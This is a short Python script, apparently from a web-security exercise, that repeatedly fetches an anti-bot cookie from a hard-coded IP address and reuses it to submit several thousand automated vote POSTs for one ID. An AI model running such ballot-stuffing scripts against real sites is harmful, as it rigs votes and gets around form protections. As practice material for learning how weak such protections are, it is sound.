#!/usr/bin/python3
import requests
"""
Post 4096 times using cookies
"""
url = 'http://158.69.76.135/level1.php'
print("--- Init POST ---")
for i in range(1, 4095):
    """Get the cookie HoldTheDoor """
    response = requests.get('http://158.69.76.135/level1.php')
    ck = response.cookies['HoldTheDoor']
    my_POST = {
        'id': 885,
        'holdthedoor': 'Submit',
        'key': str(ck)
    }
    requests.post(url, data=my_POST, cookies={'HoldTheDoor': str(ck)})
    print("POST[{:d}]".format(i))
print("--- Complete ---")

